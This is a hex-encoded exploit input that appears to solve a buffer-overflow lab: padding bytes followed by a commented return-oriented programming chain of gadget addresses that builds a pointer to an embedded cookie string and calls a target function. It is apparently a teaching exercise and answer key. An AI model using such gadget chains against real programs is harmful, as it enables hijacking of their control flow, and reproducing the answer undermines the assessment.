00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
75 18 40 00 00 00 00 00 /* pop rax */
20 00 00 00 00 00 00 00 
d3 18 40 00 00 00 00 00 /* eax -> edx */
69 19 40 00 00 00 00 00 /* edx -> ecx */
76 19 40 00 00 00 00 00 /* ecx -> esi */
df 18 40 00 00 00 00 00 /* rsp -> rax */
6d 18 40 00 00 00 00 00 /* rax -> rdi */ 
a6 18 40 00 00 00 00 00 /* call add_xy */
6d 18 40 00 00 00 00 00 /* rax -> rdi */
d7 17 40 00 00 00 00 00
34 65 30 36 61 37 30 37